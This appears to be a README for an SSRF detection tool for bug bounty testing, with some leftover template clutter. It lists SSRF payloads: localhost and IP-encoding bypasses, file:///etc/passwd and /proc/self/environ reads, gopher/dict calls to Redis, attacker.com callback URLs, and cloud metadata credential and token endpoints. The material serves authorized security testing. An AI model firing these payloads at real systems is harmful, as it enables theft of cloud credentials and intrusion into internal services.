<div align="center">

# ⚡ SSRF Hunter Pro ⚡

### Advanced Server-Side Request Forgery Detection Framework

[![Python](<https://img.shields.io/badge/Python-3.7%2B-blue?style=for-the-badge&logo=python&logoColor=white>)](<https://python.org>)
[![License](<https://img.shields.io/badge/License-MIT-green?style=for-the-badge>)](LICENSE)
[![Platform](<https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge>)]()
[![Security](<https://img.shields.io/badge/Security-Tool-red?style=for-the-badge&logo=hackaday&logoColor=white>)]()
[![Bug Bounty](<https://img.shields.io/badge/Bug%20Bounty-Ready-orange?style=for-the-badge>)]()

<div align="center">
   
```text


                     ╔═══════════════════════════════════════════════════════════════════════════════════════════╗
                     ║  ███████╗███████╗██████╗ ███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗  ║
                     ║  ██╔════╝██╔════╝██╔══██╗██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗ ║
                     ║  ███████╗███████╗██████╔╝█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝ ║
                     ║  ╚════██║╚════██║██╔══██╗██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗ ║
                     ║  ███████║███████║██║  ██║██║         ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║ ║
                     ║  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ║
                     ║                           ⚡ SSRF Detection Framework ⚡                                 ║
                     ╚═══════════════════════════════════════════════════════════════════════════════════════════╝
```
</div align="center">

</div>

## 🎯 About

**SSRF Hunter Pro** is a comprehensive, all-in-one Server-Side Request Forgery (SSRF) detection tool designed specifically for bug bounty hunters and security researchers. Built with a sleek hacker-themed GUI, it combines multiple detection techniques, bypass methods, and callback infrastructure into a single, portable Python file.

### Why SSRF Hunter Pro?

- 🔥 **Single File** - No complex installation, just run and go
- 🎨 **Hacker Theme** - Professional dark theme with neon green accents
- 🚀 **Real-World Ready** - Built for actual bug bounty programs
- 📡 **Built-in Callback Servers** - HTTP and DNS callback infrastructure
- ☁️ **Cloud-Aware** - Targets all major cloud provider metadata endpoints
- 🔓 **Bypass Arsenal** - Extensive collection of WAF/filter bypass techniques

---

## ✨ Features

### 🔍 Detection Capabilities

| Feature | Description |
|---------|-------------|
| **Basic SSRF** | Direct SSRF detection with response analysis |
| **Blind SSRF** | Out-of-band detection via callback servers |
| **Partial SSRF** | Response header analysis for partial reads |
| **Protocol Smuggling** | file://, gopher://, dict://, ldap:// protocols |

### 📡 Callback Infrastructure

| Feature | Description |
|---------|-------------|
| **HTTP Server** | Built-in HTTP/HTTPS callback receiver |
| **DNS Server** | DNS callback for DNS-only SSRF |
| **Token Tracking** | Unique tokens per injection point |
| **Request Logging** | Timestamp, source IP, headers logging |

### 🔓 Bypass Techniques

| Technique | Examples |
|-----------|----------|
| **IP Encoding** | Decimal, Hex, Octal, Mixed |
| **IPv6 Mapping** | ::ffff:127.0.0.1, [::1] |
| **URL Parser Confusion** | @, #, whitespace tricks |
| **DNS Rebinding** | Dynamic DNS resolution |
| **Redirect Chains** | Open redirect exploitation |

### ☁️ Cloud Metadata Targeting

- ✅ Amazon Web Services (AWS)
- ✅ Google Cloud Platform (GCP)
- ✅ Microsoft Azure
- ✅ DigitalOcean
- ✅ Alibaba Cloud
- ✅ Oracle Cloud
- ✅ Kubernetes

### 🌐 Network Discovery

- Internal port scanning via SSRF
- Service fingerprinting
- Response time analysis
- Common service detection

---

## 📸 Screenshots

<div align="center">

### Main Scanner Interface

**A powerful, single-file GUI tool for detecting SSRF vulnerabilities in bug bounty programs**

---

## 📸 Screenshots

<div align="center">

### Main Scanner Interface

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4fc00d61-afc8-4c77-ae16-f7e7a5f68a32" />


### Payload Generator

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dd130c2f-4938-4d22-8b6d-2614511626eb" />

</div>

---

## 🚀 Installation

### Prerequisites

- Python 3.7 or higher
- tkinter (included with Python on most systems)

### Quick Start

```bash
# Clone the repository
git clone <https://github.com/yourusername/ssrf-hunter-pro.git>

# Navigate to directory
cd 

# Run the tool
python ssrf_hunter.py

```

### One-Liner Installation

```bash
git clone <https://github.com/yourusername/ssrf-hunter-pro.git> && cd ssrf-hunter-pro && python ssrf_hunter.py

```

### Platform-Specific Notes

<details>
<summary><b>🐧 Linux</b></summary>

```bash
# Install tkinter if not present
sudo apt-get install python3-tk  # Debian/Ubuntu
sudo dnf install python3-tkinter  # Fedora
sudo pacman -S tk                  # Arch

# For DNS server on port 53 (requires root)
sudo python ssrf_hunter.py

```

</details>

<details>
<summary><b>🍎 macOS</b></summary>

```bash
# tkinter comes with Python from python.org
# If using Homebrew Python:
brew install python-tk

python3 ssrf_hunter.py

```

</details>

<details>
<summary><b>🪟 Windows</b></summary>

```powershell
# tkinter included with standard Python installation
python ssrf_hunter.py

# Or double-click ssrf_hunter.py

```

</details>

---

## 📖 Usage

### Basic Workflow

```
1. Configure Target URL
   └── Use 'INJECT' as placeholder: <http://target.com/fetch?url=INJECT>

2. Set Callback Server
   └── Enter your server address and port

3. Select Scan Options
   └── Choose detection methods and bypass techniques

4. Start Callback Server (Optional)
   └── Enable HTTP/DNS callback for blind SSRF

5. Run Scan
   └── Click "START SCAN" and monitor results

6. Export Results
   └── Save findings as JSON, HTML, or TXT

```

### Command Line Options

```bash
# Standard execution
python ssrf_hunter.py

# With elevated privileges (for DNS server on port 53)
sudo python ssrf_hunter.py

# Background execution (Linux)
nohup python ssrf_hunter.py &

```

---

## 📚 Documentation

### 🔍 SSRF Scanner Tab

The main scanning interface for testing SSRF vulnerabilities.

| Field | Description |
| --- | --- |
| **Target URL** | URL with `INJECT` placeholder for payload insertion |
| **Callback Server** | Your server address for receiving callbacks |
| **Callback Port** | Port for callback server (default: 8888) |
| **Timeout** | Request timeout in seconds |

**Scan Options:**

- `Basic SSRF Detection` - Tests standard SSRF payloads
- `Blind SSRF (OOB Detection)` - Uses callback server for blind detection
- `Protocol Smuggling` - Tests file://, gopher://, dict:// protocols
- `Cloud Metadata Endpoints` - Targets cloud provider metadata
- `Apply Bypass Techniques` - Enables WAF/filter bypasses

### 🧬 Payload Generator Tab

Generate customized payloads for manual testing.

| Payload Type | Use Case |
| --- | --- |
| **IP Address Bypasses** | Bypass IP-based blacklists |
| **Localhost Variations** | Alternative localhost representations |
| **URL Parser Confusion** | Exploit URL parser inconsistencies |
| **Protocol Smuggling** | Access internal services via protocols |
| **Redirect Bypasses** | Use open redirects for SSRF |
| **DNS Rebinding** | Dynamic DNS resolution attacks |

### 📡 Callback Server Tab

Manage built-in callback infrastructure.

| Server | Port | Purpose |
| --- | --- | --- |
| **HTTP** | 8888 (default) | Receive HTTP callbacks |
| **DNS** | 5353 (default) | Receive DNS queries |

**Token System:**

- Generates unique tracking tokens
- Format: `{8-char-hex}-{timestamp}`
- Tracks source IP, timestamp, and request details

### ☁️ Cloud Metadata Tab

Target cloud provider metadata services.

| Provider | Metadata IP | Key Endpoints |
| --- | --- | --- |
| AWS | 169.254.169.254 | /latest/meta-data/, /latest/user-data/ |
| GCP | 169.254.169.254 | /computeMetadata/v1/ |
| Azure | 169.254.169.254 | /metadata/instance |
| DigitalOcean | 169.254.169.254 | /metadata/v1/ |
| Alibaba | 100.100.100.200 | /latest/meta-data/ |

### 🌐 Network Discovery Tab

Discover internal network services via SSRF.

| Service | Default Port | Detection Method |
| --- | --- | --- |
| Redis | 6379 | dict:// protocol |
| Memcached | 11211 | gopher:// protocol |
| MySQL | 3306 | Connection response |
| PostgreSQL | 5432 | Connection response |
| Elasticsearch | 9200 | HTTP API |
| Docker API | 2375 | HTTP API |

---

## 🧬 Payload Types

### IP Address Encoding

```
Original: 127.0.0.1

Decimal:     2130706433
Hexadecimal: 0x7f000001
Octal:       0177.0.0.01
Mixed:       127.0.0x0.1
IPv6:        ::ffff:127.0.0.1
Padded:      127.000.000.001

```

### Localhost Bypasses

```
localhost
127.0.0.1
127.1
127.0.1
0.0.0.0
0
::1
[::1]
127.0.0.1.nip.io
127.0.0.1.xip.io
localtest.me

```

### Protocol Payloads

```
file:///etc/passwd
file:///proc/self/environ
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
ldap://127.0.0.1:389/
tftp://attacker.com/file

```

### URL Parser Confusion

```
<http://attacker.com#@target.com>
<http://target.com@attacker.com>
<http://attacker.com%23@target.com>
<http://attacker.com\\@target.com>
<http://attacker.com%2523@target.com>

```

---

## ☁️ Cloud Metadata Endpoints

<details>
<summary><b>AWS Endpoints</b></summary>

```
<http://169.254.169.254/latest/meta-data/>
<http://169.254.169.254/latest/meta-data/iam/security-credentials/>
<http://169.254.169.254/latest/meta-data/hostname>
<http://169.254.169.254/latest/meta-data/local-ipv4>
<http://169.254.169.254/latest/meta-data/public-ipv4>
<http://169.254.169.254/latest/user-data/>
<http://169.254.169.254/latest/dynamic/instance-identity/document>

```

</details>

<details>
<summary><b>GCP Endpoints</b></summary>

```
<http://169.254.169.254/computeMetadata/v1/>
<http://metadata.google.internal/computeMetadata/v1/>
<http://169.254.169.254/computeMetadata/v1/project/>
<http://169.254.169.254/computeMetadata/v1/instance/>
<http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token>

```

*Note: Requires header `Metadata-Flavor: Google`*

</details>

<details>
<summary><b>Azure Endpoints</b></summary>

```
<http://169.254.169.254/metadata/instance?api-version=2021-02-01>
<http://169.254.169.254/metadata/identity/oauth2/token>
<http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01>
<http://169.254.169.254/metadata/instance/network?api-version=2021-02-01>

```

*Note: Requires header `Metadata: true`*

</details>

<details>
<summary><b>Kubernetes Endpoints</b></summary>

```
<https://kubernetes.default.svc/>
<https://kubernetes.default/>
<http://localhost:10255/pods>
<http://localhost:10255/metrics>

```

</details>

---

## 🔓 Bypass Techniques

### WAF Bypass Matrix

| Technique | Payload Example | Bypass Target |
| --- | --- | --- |
| Decimal IP | `http://2130706433/` | IP blacklists |
| Hex IP | `http://0x7f000001/` | IP blacklists |
| Octal IP | `http://0177.0.0.01/` | IP blacklists |
| IPv6 | `http://[::1]/` | IPv4-only filters |
| DNS Rebinding | `http://rebind.network/` | DNS resolution |
| URL Encoding | `http://127.0.0.1%2f` | URL parsing |
| Case Variation | `HTTP://LOCALHOST/` | Case-sensitive |
| Redirect | `http://redirect.com?url=` | Whitelist bypass |

### Protocol Bypass

| Blocked | Bypass Payload |
| --- | --- |
| `http://` | `gopher://`, `dict://`, `file://` |
| `localhost` | `127.0.0.1`, `[::1]`, `0` |
| `169.254.169.254` | `169.254.169.254.xip.io` |
| Direct IP | Open redirect chain |

---

## 📡 Callback Infrastructure

### Setting Up Callback Server

```
1. Go to "Callback Server" tab
2. Set HTTP port (default: 8888)
3. Click "Start HTTP Server"
4. Generate tracking token
5. Use callback URL in payloads

```

### Callback URL Format

```
<http://your-server.com:8888/{token}>

Example:
<http://attacker.com:8888/a1b2c3d4-1699900000>

```

### DNS Callback Setup

```bash
# Requires elevated privileges for port 53
sudo python ssrf_hunter.py

# Or use alternate port (5353)
# Configure: your-domain.com:5353

```

### Callback Detection Flow

```
[Target App] --SSRF--> [Your Callback Server]
                              |
                              v
                    [Token Matched]
                              |
                              v
                    [Log: IP, Time, Headers]
                              |
                              v
                    [SSRF Confirmed!]

```

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Ways to Contribute

- 🐛 Report bugs and issues
- 💡 Suggest new features
- 📝 Improve documentation
- 🔧 Submit pull requests
- 🧪 Add new bypass techniques
- ☁️ Add cloud provider endpoints

### Development Setup

```bash
# Fork the repository
# Clone your fork
git clone <https://github.com/yourusername/ssrf-hunter-pro.git>

# Create feature branch
git checkout -b feature/amazing-feature

# Make changes and commit
git commit -m "Add amazing feature"

# Push to branch
git push origin feature/amazing-feature

# Open Pull Request

```

### Code Style

- Follow PEP 8 guidelines
- Add comments for complex logic
- Update documentation for new features
- Include payload examples where applicable

---

## ⚖️ Legal Disclaimer

```
╔════════════════════════════════════════════════════════════════════════════════╗
║                              ⚠️  WARNING  ⚠️                                   ║
╠════════════════════════════════════════════════════════════════════════════════╣
║  This tool is intended for AUTHORIZED SECURITY TESTING ONLY.                  ║
║                                                                                ║
║  Usage of SSRF Hunter Pro for attacking targets without prior mutual          ║
║  consent is ILLEGAL. It is the end user's responsibility to obey all          ║
║  applicable local, state, and federal laws.                                   ║
║                                                                                ║
║  Developers assume NO liability and are NOT responsible for any misuse        ║
║  or damage caused by this program.                                            ║
║                                                                                ║
║  Only use this tool on:                                                        ║
║    ✓ Systems you own                                                          ║
║    ✓ Systems you have written permission to test                              ║
║    ✓ Bug bounty programs that allow SSRF testing                              ║
╚════════════════════════════════════════════════════════════════════════════════╝

```

### Responsible Use

- ✅ Always get written authorization
- ✅ Follow bug bounty program rules
- ✅ Report vulnerabilities responsibly
- ✅ Respect rate limits and scope
- ❌ Never test without permission
- ❌ Never exfiltrate sensitive data
- ❌ Never use for malicious purposes

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](https://www.notion.so/LICENSE) file for details.

```
MIT License

Copyright (c) 2024 SSRF Hunter Pro

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

---

## 🙏 Acknowledgments

- OWASP SSRF Prevention Cheat Sheet
- PortSwigger Web Security Academy
- Bug Bounty Community
- All security researchers contributing bypass techniques

---

## 📬 Contact

- **GitHub Issues**: [Report Bug](https://github.com/yourusername/ssrf-hunter-pro/issues)
- **Twitter**: [@yourusername](https://twitter.com/yourusername)
- **Email**: [security@yourdomain.com](mailto:security@yourdomain.com)

---

<div align="center">

### ⭐ Star this repository if you find it useful!

**Made with ❤️ for the Bug Bounty Community**

[GitHub Stars](https://img.shields.io/github/stars/yourusername/ssrf-hunter-pro?style=social)

[Follow](https://img.shields.io/twitter/follow/yourusername?style=social)

</div>

```

---

## 📁 Additional Files to Create

### LICENSE

```

MIT License

Copyright (c) 2024 SSRF Hunter Pro

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

### .gitignore

```gitignore
# Byte-compiled files
__pycache__/
*.py[cod]
*$py.class

# Virtual environment
venv/
env/
.env

# IDE
.idea/
.vscode/
*.swp
*.swo

# Logs
*.log
logs/

# Results
results/
*.json
*.html
reports/

# OS files
.DS_Store
Thumbs.db

# Temporary files
*.tmp
*.temp

```
